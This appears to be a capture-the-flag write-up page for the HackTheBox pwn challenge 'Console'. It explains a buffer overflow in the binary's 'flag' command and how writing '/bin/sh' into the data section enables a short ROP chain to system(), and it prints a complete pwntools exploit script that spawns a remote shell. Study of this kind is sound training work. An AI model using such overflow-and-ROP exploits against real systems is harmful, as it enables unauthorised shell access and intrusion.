@@ -1,0 +1,85 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>PWN/HTB Console - Easy</h1>
+            <h2>July 2021</h2>
+            <h4>Basic system('/bin/sh')</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+    Check out the all new HTB Console! Don't try to pwn it though.
+    <br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
+        <br>
+    	Running the binary does not provide us with much information, so we need to start by reversing it before we can do anything. It appears to be fairly short and only has 2 functions of interest to us, both of which are showcased in the below screenshot. First the main function which runs an infinite loop asking us for input and then calling the run() function using this input. <br> The run function is a a little like a control center. It takes this input and executes different commands depending on what it was. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/console1.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        The id, dir, ls and default commands are basically completely useless to us since they just print out static messages using puts(). The remaining functions however have some vulnerabilities that we can exploit to get the flag. There is a buffer overflow in the 'flag' command, which allows us to redirect execution. Additionally since the binary is compiled without pie, we know the address of system() since it is used in the binary under the data command. Using the 'hof' command we also have the option of writing an arbitrary string into the data section. This means that we can first write '/bin/sh\0' into the data section, and then use the buffer overflow to execute a small rop chain to pop the string into rdi, and call system. <br><br> Executing the exploit remotely allows us to retrieve the flag. The full exploit is posted below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/console2.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./vuln')
+libc = elf.libc
+
+local = False
+
+if local:
+    p = elf.process()
+else:
+    host = '139.59.166.56'
+    port = 31469
+    p = remote(host,port)
+
+pop_rdi = p64(0x401473)
+binsh = p64(0x4040b0)
+system = p64(0x401381)
+
+payload = b'A'*24 + pop_rdi + binsh + system
+
+p.sendline('hof')
+p.sendline('/bin/sh\0')
+
+p.sendline('flag')
+p.sendline(payload)
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
+
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
